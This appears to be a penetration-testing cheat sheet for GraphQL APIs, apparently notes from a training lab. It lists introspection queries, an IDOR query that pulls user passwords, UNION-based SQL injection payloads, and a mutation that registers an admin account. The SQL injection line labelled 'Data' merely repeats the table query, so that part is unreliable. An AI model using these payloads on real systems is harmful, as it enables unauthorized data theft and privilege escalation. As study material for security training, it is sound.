# GraphQL
- Example
```bash
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```
# Identifying
<img width="1546" height="507" alt="image" src="https://github.com/user-attachments/assets/2cc5b993-d3cb-4838-8ce4-f768190127d2" />

Note: there is a automated tool called [graphw00f](https://github.com/dolevf/graphw00f)

## Introspection
```bash
{__schema {types {name}}}
# OR
{__schema {queryType {fields {name description}}}}
```
<img width="1110" height="289" alt="image" src="https://github.com/user-attachments/assets/1b4209b1-6b67-400e-93f6-975cb39366d1" />

Once got the information:
```bash
{__type(name: "UserObject") {name fields {name type {name kind}}}}

{ __type(name: \"SecretObject\") { name fields { name type { name kind } } } }
```

## Get Information
```bash
query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
```

# IDOR
## Reconnaice
```bash
{ user(username: \"htb-stdnt\") { username password } }
```
# Injection Attacks
## SQLI
```bash
# Table
{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {username password role}}
# Column
{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\") {username password role}}
# Data
{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {username password role}}
```
## XSS
<img width="1548" height="421" alt="image" src="https://github.com/user-attachments/assets/2db00f0f-99af-4275-bccd-eb2c248083b2" />

# Mutations
- Reconnaice
```bash
query { __schema { mutationType { name fields { name args { name defaultValue type { ...TypeRef } } } } } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
```

```bash
{ __type(name: \"RegisterUserInput\") { name inputFields { name description defaultValue } } }
```

```bash
mutation{ registerUser(input: {username:\"user\", password: \"ee11cbb19052e40b07aac0ca060c23ee\", role:\"admin\", msg:\"chupapi\"}) {user {username password role msg}}}
```
